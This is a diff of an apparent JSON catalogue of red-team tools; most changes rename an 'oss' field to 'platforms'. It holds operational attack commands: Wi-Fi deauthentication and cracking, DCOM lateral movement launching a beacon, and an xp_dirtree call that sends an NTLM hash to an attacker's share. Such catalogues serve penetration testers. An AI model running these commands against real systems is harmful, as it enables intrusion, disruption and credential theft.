@@ -6,7 +6,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/HarmJ0y/DAMP/blob/master/Add-RemoteRegBackdoor.ps1",
@@ -33,7 +33,7 @@
         ],
         "category": "",
         "stealthy": true,
-        "oss": [
+        "platforms": [
             "Windows",
             "Linux"
         ],
@@ -51,7 +51,7 @@
         ],
         "category": "Enumeration",
         "stealthy": true,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/tomcarver16/ADSearch",
@@ -71,12 +71,61 @@
         "oss": [
             "Linux"
         ],
-        "source": "",
-        "description": "",
+        "source": "https://www.aircrack-ng.org/",
+        "description": "Aircrack-ng is a complete suite of tools to assess Wi-Fi network security.",
         "undetected": [],
         "detected": [],
-        "content": "# aircrack-ng\n\n```java\napt-get install aircrack-ng -y\n```\n\n## [[WiFi crack]]\n```java\n//Set wificard in monitor mode (monitor.sh)\nIfconfig\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 --> take wlan card name\nIfconfig name down\u00a0\u00a0\u00a0\u00a0 //runterfahren\nIfconfig name mode monitor\nIfconfig name up\nIwconfig name | grep Mode\n\n//Change MAC\n\n\n//Check if prozess interfering! IF KILL\nAirmon-ng check name\nKill 1312 (Networkmanager)\nKill\u00a017917 (dhclient)\nKill 1556, 1215, 1216\n\n//Netzwerk sniffen\nAirodump-ng name\nAirodumo -c [channel] -w [FILE] --bsssid [MAC]\nAirplay-ng -0 0 -a [MAC]              //deauthenticate dauerhaft\nAircrack-ng -w [word list] capture.cap\n\n//Change networkcard channel to Router channel\nAireplay-ng -0 0 -a [MAC] name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 --> get channel + MAC(bssid)\nIwconfig name channel 6\n```\n\n\n",
-        "commands": []
+        "content": "# aircrack-ng\n\n'''java\napt-get install aircrack-ng -y\n'''\n\n## [[WiFi crack]]\n'''java\n//Set wificard in monitor mode (monitor.sh)\nIfconfig\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 --> take wlan card name\nIfconfig name down\u00a0\u00a0\u00a0\u00a0 //runterfahren\nIfconfig name mode monitor\nIfconfig name up\nIwconfig name | grep Mode\n\n//Change MAC\n\n\n//Check if prozess interfering! IF KILL\nAirmon-ng check name\nKill 1312 (Networkmanager)\nKill\u00a017917 (dhclient)\nKill 1556, 1215, 1216\n\n//Netzwerk sniffen\nAirodump-ng name\nAirodumo -c [channel] -w [FILE] --bsssid [MAC]\nAirplay-ng -0 0 -a [MAC]              //deauthenticate dauerhaft\nAircrack-ng -w [word list] capture.cap\n\n//Change networkcard channel to Router channel\nAireplay-ng -0 0 -a [MAC] name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 --> get channel + MAC(bssid)\nIwconfig name channel 6\n'''\n\n\n",
+        "commands": [
+            {
+                "id": "0a82bdb0-4e8d-4dfa-b855-0194965b85a9",
+                "name": "Activate monitor mode",
+                "description": "Get the interface and put it into monitoring mode",
+                "tag": "",
+                "results": [],
+                "cmd": "Ifconfig\nIfconfig <if> down\nIfconfig <if> mode monitor\nIfconfig <if> up\nIwconfig <if> | grep Mode"
+            },
+            {
+                "id": "609c27b6-c698-4641-b262-5afbf527920f",
+                "name": "Check for interfering processes",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "airmon-ng check <if>"
+            },
+            {
+                "id": "8fac72ec-9855-4a68-a334-024d5303eb07",
+                "name": "Sniff network",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Airodump-ng name\nAirodump -c [channel] -w [FILE] --bsssid [MAC]"
+            },
+            {
+                "id": "9969180d-e48a-4a57-8b78-d249bdfee6fd",
+                "name": "Deauth device",
+                "description": "Deauthenticate a device permanently",
+                "tag": "",
+                "results": [],
+                "cmd": "Airplay-ng -0 0 -a [MAC]"
+            },
+            {
+                "id": "47ad1864-2180-4d2b-9e28-a23c55d1d5dc",
+                "name": "Aircrack with wordlist",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Aircrack-ng -w [word list] capture.cap"
+            },
+            {
+                "id": "047b2311-6a3d-4e2d-8e89-fcde97fa3575",
+                "name": "Change interface channel",
+                "description": "Change network card channel to router channel",
+                "tag": "",
+                "results": [],
+                "cmd": "Aireplay-ng -0 0 -a [MAC] <if>\nIwconfig <if> channel <6>"
+            }
+        ]
     },
     {
         "name": "Amass",
@@ -85,8 +134,8 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
-            "Cross Platform (GO)"
+        "platforms": [
+            "Cross platforms (GO)"
         ],
         "source": "https://github.com/OWASP/Amass",
         "description": "The OWASP Amass Project performs network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques.",
@@ -102,7 +151,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "http//www.rohitab.com/",
@@ -119,7 +168,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/PKISolutions/Asn1Editor.WPF",
@@ -136,7 +185,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/Flangvik/AzureC2Relay",
@@ -162,7 +211,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/Yaxser/Backstab",
@@ -180,7 +229,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/bettercap/bettercap",
@@ -198,7 +247,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/BloodHoundAD/BloodHound",
@@ -215,7 +264,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/FortyNorthSecurity/C2concealer",
@@ -249,7 +298,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/GhostPack/Certify",
@@ -273,8 +322,25 @@
         "description": "Password list generator",
         "undetected": [],
         "detected": [],
-        "content": "# Cewl\n\n## [[Password Spraying]]\nSpider and build dictionary\n```\ncewl -w createWordlist.txt https://www.example.com\n```\n\nAdd minimum password length:\n```\ncewl -w createWordlist.txt -m 6 https://www.example.com\n```\n\n\n",
-        "commands": []
+        "content": "# Cewl\n\n## [[Password Spraying]]\nSpider and build dictionary\n'''\ncewl -w createWordlist.txt https://www.example.com\n'''\n\nAdd minimum password length:\n'''\ncewl -w createWordlist.txt -m 6 https://www.example.com\n'''\n\n\n",
+        "commands": [
+            {
+                "id": "f715c0ee-840f-481c-9999-e8dc102ea5cc",
+                "name": "Build dict from web",
+                "description": "Spider and build dictionary from website",
+                "tag": "",
+                "results": [],
+                "cmd": "cewl -w createWordlist.txt https://www.example.com"
+            },
+            {
+                "id": "ba34fd28-316f-4d8c-99a2-464b6f5e03e4",
+                "name": "Build dict from web min pw length",
+                "description": "Spider and build dictionary from website with a minimum password length",
+                "tag": "",
+                "results": [],
+                "cmd": "cewl -w createWordlist.txt -m 6 https://www.example.com"
+            }
+        ]
     },
     {
         "name": "Chameleon",
@@ -284,7 +350,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Python"
         ],
         "source": "https://github.com/mdsecactivebreach/Chameleon",
@@ -316,7 +382,7 @@
         "phases": [],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/Cracked5pider/CoffeeLdr",
@@ -333,7 +399,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/galihap76/collector",
@@ -352,7 +418,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/byt3bl33d3r/CrackMapExec",
@@ -369,7 +435,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/threatexpress/cs2modrewrite",
@@ -386,7 +452,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/bashexplode/cs2webconfig",
@@ -403,7 +469,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Python"
         ],
         "source": "https://github.com/darkoperator/dnsrecon",
@@ -420,7 +486,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/outflanknl/Dumpert",
@@ -439,7 +505,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "",
@@ -457,7 +523,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [],
+        "platforms": [],
         "source": "https://github.com/chenjj/espoofer",
         "description": "",
         "undetected": [],
@@ -473,7 +539,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/Ettercap/ettercap",
@@ -491,7 +557,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Python",
             "Windows"
         ],
@@ -509,7 +575,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Python"
         ],
         "source": "https://github.com/thewhiteh4t/FinalRecon",
@@ -526,7 +592,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/ElevenPaths/FOCA",
@@ -544,7 +610,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/GhostPack/ForgeCert",
@@ -561,7 +627,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/FreeRDP/FreeRDP",
@@ -578,7 +644,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1",
@@ -596,7 +662,7 @@
         ],
         "category": "",
         "stealthy": true,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/sensepost/gowitness",
@@ -613,7 +679,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/PowerShell/GPRegistryPolicyParser",
@@ -630,7 +696,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/EspressoCake/HandleKatz_BOF",
@@ -653,7 +719,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/codewhitesec/HandleKatz",
@@ -675,7 +741,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://hashcat.net/hashcat/",
@@ -692,7 +758,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://www.heidisql.com/",
@@ -710,11 +776,11 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/Kevin-Robertson/InveighZero",
-        "description": "Inveigh is a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool.",
+        "description": "Inveigh is a cross-platforms .NET IPv4/IPv6 machine-in-the-middle tool.",
         "undetected": [],
         "detected": [],
         "content": "# InveighZero\n\n## [[NTLM Relaying]]\nCapture NetNTLM hash\nThis should be run as a local admin.\n\n\u2139 InveighZero will ignore traffic coming from accounts that are generally deemed to be \"uncrackable\" such as computer accounts.\n```beacon\nbeacon> execute-assembly C:\\Tools\\InveighZero\\Inveigh\\bin\\Debug\\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N\n\n[*] Inveigh 0.913 started at 2022-03-10T18:02:36\n[+] Elevated Privilege Mode = Enabled\n[+] Primary IP Address = 10.10.17.231\n[+] Spoofer IP Address = 10.10.17.231\n[+] Packet Sniffer = Enabled\n[+] DHCPv6 Spoofer = Disabled\n[+] DNS Spoofer = Disabled\n[+] LLMNR Spoofer = Disabled\n[+] LLMNRv6 Spoofer = Disabled\n[+] mDNS Spoofer = Disabled\n[+] NBNS Spoofer = Disabled\n[+] HTTP Capture = Disabled\n[+] Proxy Capture = Disabled\n[+] WPAD Authentication = NTLM\n[+] WPAD NTLM Authentication Ignore List = Firefox\n[+] SMB Capture = Enabled\n[+] Machine Account Capture = Disabled\n[+] File Output = Disabled\n[+] Log Output = Enabled\n[+] Pcap Output = Disabled\n[+] Previous Session Files = Not Found\n[*] Press ESC to access console\n```\n\n## [[SQL NetNTLM Capture]]\nWe can use [[InveighZero]] to listen to the incoming requests (this should be run as a local admin).\n1. [[InveighZero#Capture NetNTLM hash]]\n2. Run `xp_dirtree` to connect the sql server to your machine running [[InveighZero]]\n>EXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1\n3. Receive hash on the attacking machine\n```beacon\n[+] [2022-05-14T15:33:49] TCP(445) SYN packet from 10.10.1.20:50323\n[+] [2022-05-14T15:33:49] SMB(445) negotiation request detected from 10.10.1.20:50323\n[+] [2022-05-14T15:33:49] SMB(445) NTLM challenge 3006547FFC8E90D8 sent to 10.10.1.20:50323\n[+] [2022-05-14T15:33:49] SMB(445) NTLMv2 captured for EDU\\svc_mssql from 10.10.1.20(SRV1):50323:\nsvc_mssql::EDU:[...snip...]\n```\n4. [[Hashcat#Cracking netntlmv2]]\n\n\n",
@@ -732,11 +798,44 @@
             "Windows"
         ],
         "source": "https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1",
-        "description": "Lateral Move via DCOM",
+        "description": "Lateral Move via DCOM.",
         "undetected": [],
         "detected": [],
-        "content": "# Invoke-DCOM\n\n## [[DCOM]]\n```\nImport-Module .\\Invoke-DCOM.ps1\nInvoke-DCOM -ComputerName '192.168.2.100' -Method MMC20.Application -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '192.168.2.100' -Method ExcelDDE -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '192.168.2.100' -Method ServiceStart \"MyService\"\n```\n\nTo interact over Distributed Component Object Model (DCOM), we must use an external tool such as [[Invoke-DCOM]].\n``````beacon\nbeacon> powershell-import C:\\Tools\\Invoke-DCOM.ps1\nbeacon> powershell Invoke-DCOM -ComputerName srv1 -Method MMC20.Application -Command C:\\Windows\\beacon-smb.exe\nCompleted\n\nbeacon> link srv1\n[+] established link to child beacon: 10.10.1.20\n``````\n\nDCOM is more complicated to detect, since each \"Method\" works in a different way. In the particular case of `MMC20.Application`, the spawned process will be a child of `mmc.exe`.\n\n``````\nProcessId: 952\nImage: C:\\Windows\\beacon-smb.exe\nParentImage: C:\\Windows\\System32\\mmc.exe\n``````  \nProcesses started via DCOM may also be seen where the parent is `svchost.exe` (started with the command line `-k DcomLaunch`).\n\n",
-        "commands": []
+        "content": "# Invoke-DCOM\n\n## [[DCOM]]\n'''\nImport-Module .\\Invoke-DCOM.ps1\nInvoke-DCOM -ComputerName '192.168.2.100' -Method MMC20.Application -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '192.168.2.100' -Method ExcelDDE -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '192.168.2.100' -Method ServiceStart \"MyService\"\n'''\n\nTo interact over Distributed Component Object Model (DCOM), we must use an external tool such as [[Invoke-DCOM]].\n''''''beacon\nbeacon> powershell-import C:\\Tools\\Invoke-DCOM.ps1\nbeacon> powershell Invoke-DCOM -ComputerName srv1 -Method MMC20.Application -Command C:\\Windows\\beacon-smb.exe\nCompleted\n\nbeacon> link srv1\n[+] established link to child beacon: 10.10.1.20\n''''''\n\nDCOM is more complicated to detect, since each \"Method\" works in a different way. In the particular case of 'MMC20.Application', the spawned process will be a child of 'mmc.exe'.\n\n''''''\nProcessId: 952\nImage: C:\\Windows\\beacon-smb.exe\nParentImage: C:\\Windows\\System32\\mmc.exe\n''''''  \nProcesses started via DCOM may also be seen where the parent is 'svchost.exe' (started with the command line '-k DcomLaunch').\n\n",
+        "commands": [
+            {
+                "id": "cfb6398e-d128-41e6-8e25-9f3effdcf564",
+                "name": "Import",
+                "description": "Import module",
+                "tag": "",
+                "results": [],
+                "cmd": "Import-Module .\\Invoke-DCOM.ps1"
+            },
+            {
+                "id": "ffd4d5ff-e7cf-4621-b07d-f69d9687b635",
+                "name": "Execute command via MMC20.Application",
+                "description": "Svchost spawns mmc.exe which opens a listening port via RPC binding",
+                "tag": "",
+                "results": [],
+                "cmd": "Invoke-DCOM -ComputerName '192.168.2.100' -Method MMC20.Application -Command \"calc.exe\""
+            },
+            {
+                "id": "ded4b315-b2e7-435b-bb11-d21234a1b32c",
+                "name": "Execute command via ExcelDDE",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Invoke-DCOM -ComputerName '192.168.2.100' -Method ExcelDDE -Command \"calc.exe\""
+            },
+            {
+                "id": "16dee6f1-13c1-4e1c-a5e1-52a17830506b",
+                "name": "Execute command via ServiceStart ",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Invoke-DCOM -ComputerName '192.168.2.100' -Method ServiceStart \"MyService\""
+            }
+        ]
     },
     {
         "name": "Invoke-Obfuscation",
@@ -745,7 +844,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/danielbohannon/Invoke-Obfuscation",
@@ -763,7 +862,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://www.openwall.com/john/",
@@ -780,7 +879,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/pwn1sher/KillDefender",
@@ -799,7 +898,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows",
             "Linux"
         ],
@@ -818,7 +917,7 @@
         ],
         "category": "Enumeration",
         "stealthy": true,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://linux.die.net/man/1/ldapsearch",
@@ -835,7 +934,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Python"
         ],
         "source": "https://github.com/vysecurity/LinkedInt",
@@ -852,7 +951,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Python"
         ],
         "source": "https://github.com/0x802/LinkSniper",
@@ -870,7 +969,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/dafthack/MailSniper",
@@ -887,7 +986,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Python"
         ],
         "source": "https://github.com/blacklanternsecurity/MANSPIDER",
@@ -904,7 +1003,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux",
             "Windows",
             "#mac"
@@ -923,7 +1022,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Python"
         ],
         "source": "https://github.com/opsdisk/metagoofil",
@@ -940,7 +1039,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/dafthack/MFASweep",
@@ -961,7 +1060,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/gentilkiwi/mimikatz",
@@ -978,7 +1077,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/cube0x0/MiniDump",
@@ -995,7 +1094,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/makdosx/mip22",
@@ -1014,7 +1113,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "",
@@ -1031,7 +1130,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "Impacket",
@@ -1049,7 +1148,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "",
@@ -1066,7 +1165,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/charlesroelli/nbtscan",
@@ -1083,7 +1182,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/nmap/ncrack",
@@ -1101,7 +1200,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "",
@@ -1118,7 +1217,7 @@
         ],
         "category": "",
         "stealthy": true,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "http//netcat.sourceforge.net/",
@@ -1135,7 +1234,7 @@
         ],
         "category": "",
         "stealthy": true,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "",
@@ -1152,7 +1251,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/htr-tech/nexphisher",
@@ -1169,7 +1268,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/icyguider/Nimcrypt2",
@@ -1188,7 +1287,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux",
             "Windows"
         ],
@@ -1206,7 +1305,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "",
@@ -1224,7 +1323,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "",
@@ -1241,7 +1340,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/SecureAuthCorp/impacket/tree/master/impacket/examples/ntlmrelayx",
@@ -1258,7 +1357,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/FSecureLABS/physmem2profit",
@@ -1275,7 +1374,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/praetorian-inc/PortBender",
@@ -1292,7 +1391,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/Kevin-Robertson/Powermad",
@@ -1313,7 +1412,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "",
@@ -1331,7 +1430,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/NetSPI/PowerUp",
@@ -1349,7 +1448,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/NetSPI/PowerUpSQL",
@@ -1370,7 +1469,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1",
@@ -1388,7 +1487,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/leechristensen/SpoolSample",
@@ -1406,7 +1505,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/winsiderss/systeminformer",
@@ -1424,7 +1523,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows",
             "Linux"
         ],
@@ -1442,7 +1541,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Python"
         ],
         "source": "https://github.com/nettitude/Prowl",
@@ -1459,7 +1558,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://www.proxifier.com/",
@@ -1476,7 +1575,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/haad/proxychains",
@@ -1493,8 +1592,8 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
-            "Cross Platform (GO)"
+        "platforms": [
+            "Cross platforms (GO)"
         ],
         "source": "https://github.com/0x09AL/raven",
         "description": "raven is a Linkedin information gathering tool that can be used by pentesters to gather information about an organization employees using Linkedin.",
@@ -1510,7 +1609,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/0x09AL/RdpThief",
@@ -1527,7 +1626,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Python"
         ],
         "source": "https://github.com/lanmaster53/recon-ng",
@@ -1544,7 +1643,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "Windows",
@@ -1561,7 +1660,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "Windows additional features",
@@ -1578,7 +1677,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/lgandx/Responder",
@@ -1595,7 +1694,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://www.mankier.com/1/rpcclient",
@@ -1614,7 +1713,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/GhostPack/Rubeus",
@@ -1633,7 +1732,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux",
             "Windows",
             "#mac"
@@ -1652,7 +1751,7 @@
         ],
         "category": "",
         "stealthy": true,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/Idov31/Sandman",
@@ -1669,7 +1768,7 @@
         ],
         "category": "",
         "stealthy": true,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "",
@@ -1688,7 +1787,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/GhostPack/Seatbelt",
@@ -1705,7 +1804,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py",
@@ -1722,7 +1821,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/Arvanaghi/SessionGopher",
@@ -1739,7 +1838,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/djhohnstein/SharpChromium",
@@ -1756,7 +1855,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/GhostPack/SharpDPAPI",
@@ -1774,7 +1873,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/mandiant/SharPersist",
@@ -1791,7 +1890,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [],
+        "platforms": [],
         "source": "https://github.com/FSecureLABS/SharpGPOAbuse",
         "description": "",
         "undetected": [],
@@ -1807,7 +1906,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/BloodHoundAD/SharpHound",
@@ -1825,7 +1924,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/cube0x0/SharpSystemTriggers",
@@ -1842,7 +1941,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/tevora-threat/SharpView",
@@ -1859,7 +1958,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "",
@@ -1876,7 +1975,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "",
@@ -1893,7 +1992,7 @@
         ],
         "category": "",
